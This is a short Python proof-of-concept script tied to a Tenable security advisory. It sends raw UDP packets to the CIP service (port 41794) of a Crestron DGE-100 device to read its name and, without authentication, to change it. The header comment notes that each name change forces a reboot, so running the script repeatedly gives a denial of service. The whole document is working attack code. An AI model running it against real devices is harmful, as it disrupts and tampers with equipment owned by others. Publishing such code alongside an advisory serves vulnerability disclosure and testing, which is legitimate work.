##
# The following script allows the user to get the name of a remote
# DGE-100 with CIP (UDP port 41794) and also change the name if desired.
# Name changing triggers a reboot, so a malicious attacker could run
# this over and over again to achieve DoS.
#
# Advisory: https://www.tenable.com/security/research/tra-2019-05
##

import socket
import struct
import argparse

cmd_parser = argparse.ArgumentParser(description="PoC")
cmd_parser.add_argument("-i", "--ip", action="store", dest="ip", required=True, help="The IPv4 address to connect to")
cmd_parser.add_argument("-p", "--port", action="store", dest="port", type=int, help="The port to connect to", default="41794")
cmd_parser.add_argument("-n", "--name", action="store", dest="name", help="The new hostname")
args = cmd_parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('', 41794))

# step one - send a discovery message so we can see the current name
name = "1"
sock.sendto("\x14\x00\x00\x00\x01\x04\x00\x03\x00\x00\x41\x00" + ("\x00" * 254), (args.ip, args.port))

print sock.recv(1024)

# step two - if a new name is set then send the change request
if args.name is not None:
	payload = args.name + "\x00" + ("\x00" * (255 - len(args.name)))
	header = "\x18" # cmd
	header += "\x00\x00\x00"
	header += struct.pack(">H", len(payload))
	header += payload
	sock.sendto(header, (args.ip, args.port))
	print sock.recv(1024)

sock.close()
